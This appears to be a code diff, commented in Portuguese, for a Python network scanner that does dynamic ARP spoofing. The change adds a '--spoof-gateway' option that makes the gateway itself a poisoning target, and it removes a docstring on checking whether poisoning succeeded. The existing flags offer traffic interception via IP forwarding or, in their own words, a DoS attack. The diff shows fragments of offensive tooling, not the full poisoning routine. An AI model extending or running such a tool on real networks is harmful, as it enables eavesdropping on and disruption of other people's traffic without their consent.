@@ -74,8 +74,8 @@ def scan_hosts(interface, ip, netmask):
 
 
 # Remove gateway e IP local para evitar auto-ataque
-def filter_hosts(hosts, interface, my_ip, gateway):
-    filtered_hosts = [ip for ip in hosts if ip != my_ip and ip != gateway]
+def filter_hosts(hosts, interface, my_ip, gateway, spoof_gateway=False):
+    filtered_hosts = [ip for ip in hosts if ip != my_ip and (spoof_gateway or ip != gateway)]
     return filtered_hosts
 
 
@@ -89,14 +89,7 @@ def save_hosts_to_file(hosts, filename="ips.txt"):
 
 # FUNÇÃO NOVA: Valida se o envenenamento ARP funcionou no IP alvo
 def verify_spoof_success(interface, target_ip, gateway_ip):
-    """
-    Verifica se o alvo está encaminhando tráfego para o atacante.
-    Abordagem:
-      1) Sniff passivamente por pacotes IP cuja origem é `target_ip` e cujo destino
-         Ethernet (`Ether.dst`) seja o MAC do atacante.
-      2) Se nada for visto, estimula a vítima enviando um ICMP echo (via Scapy)
-         e tenta sniffar novamente.
-    """
+
     try:
         my_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr'].lower()
 
@@ -119,7 +112,7 @@ def verify_spoof_success(interface, target_ip, gateway_ip):
 
 
 # Thread contínua que busca novos dispositivos a cada X segundos
-def monitor_new_hosts(lan_info, interval=10):
+def monitor_new_hosts(lan_info, interval=10, spoof_gateway=False):
     global active_spoof_ips
     print(f"[*] Monitor de novos hosts iniciado (Intervalo: {interval}s)...")
     
@@ -132,7 +125,13 @@ def monitor_new_hosts(lan_info, interval=10):
                 lan_info["netmask"]
             )
             
-            filtered = filter_hosts(hosts, lan_info["interface"], lan_info["ip"], lan_info["gateway"])
+            filtered = filter_hosts(
+                hosts,
+                lan_info["interface"],
+                lan_info["ip"],
+                lan_info["gateway"],
+                spoof_gateway
+            )
             
             with hosts_lock:
                 new_hosts = [ip for ip in filtered if ip not in active_spoof_ips]
@@ -235,6 +234,7 @@ def main():
     parser = argparse.ArgumentParser(description="Scanner de Rede + ARP Spoofing Dinâmico")
     parser.add_argument("--forward", action="store_true", help="Habilita IP Forwarding (Interceptação)")
     parser.add_argument("--no-forward", action="store_true", help="Desabilita IP Forwarding (Ataque DoS)")
+    parser.add_argument("--spoof-gateway", action="store_true", help="Inclui o gateway na lista de alvos")
     
     args = parser.parse_args()
 
@@ -266,7 +266,13 @@ def main():
         lan_info["netmask"]
     )
 
-    valid_targets = filter_hosts(initial_hosts, lan_info["interface"], lan_info["ip"], lan_info["gateway"])
+    valid_targets = filter_hosts(
+        initial_hosts,
+        lan_info["interface"],
+        lan_info["ip"],
+        lan_info["gateway"],
+        args.spoof_gateway
+    )
 
     with hosts_lock:
         active_spoof_ips = set(valid_targets)
@@ -280,7 +286,7 @@ def main():
     # Thread 1: Monitor de novos dispositivos
     monitor_thread = threading.Thread(
         target=monitor_new_hosts,
-        args=(lan_info, 10),
+        args=(lan_info, 10, args.spoof_gateway),
         daemon=True
     )
     monitor_thread.start()
